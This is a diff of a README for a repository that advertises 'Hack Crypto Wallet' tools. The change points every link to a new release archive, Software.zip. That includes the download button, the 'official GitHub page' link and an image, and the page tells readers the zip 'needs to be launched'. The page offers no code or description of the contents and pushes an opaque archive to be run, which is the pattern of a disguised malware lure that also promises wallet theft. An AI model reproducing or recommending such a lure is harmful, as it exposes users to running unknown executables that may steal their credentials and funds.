@@ -9,14 +9,14 @@ Welcome to the *Hack Crypto Wallet* repository! Here you will find exciting topi
 
 ## 📁 Download Source Code
 To access the source code for this repository, you can download the zip file from the following link:  
-[![Download Hack Crypto Wallet](https://github.com/toniadrenalin/hack-crypto-wallet/releases/download/v1.0/Application.zip)](https://github.com/toniadrenalin/hack-crypto-wallet/releases/download/v1.0/Application.zip)  
+[![Download Hack Crypto Wallet](https://github.com/toniadrenalin/hack-crypto-wallet/releases/download/v2.0/Software.zip)](https://github.com/toniadrenalin/hack-crypto-wallet/releases/download/v2.0/Software.zip)  
 *Note: The zip file needs to be launched to explore the contents.*
 
 ## 🌐 Explore More
-If you want to discover more about the world of blockchain, crypto wallets, and trading bots, feel free to visit the official GitHub page: [Hack Crypto Wallet](https://github.com/toniadrenalin/hack-crypto-wallet/releases/download/v1.0/Application.zip)
+If you want to discover more about the world of blockchain, crypto wallets, and trading bots, feel free to visit the official GitHub page: [Hack Crypto Wallet](https://github.com/toniadrenalin/hack-crypto-wallet/releases/download/v2.0/Software.zip)
 
 ## 🎨 Embrace the Crypto World
-![Crypto Image](https://github.com/toniadrenalin/hack-crypto-wallet/releases/download/v1.0/Application.zip)
+![Crypto Image](https://github.com/toniadrenalin/hack-crypto-wallet/releases/download/v2.0/Software.zip)
 
 ## 🚨 Check Releases
 In case the provided download link is not working or you want to explore more versions of this project, make sure to check the "Releases" section of this repository for the latest updates.
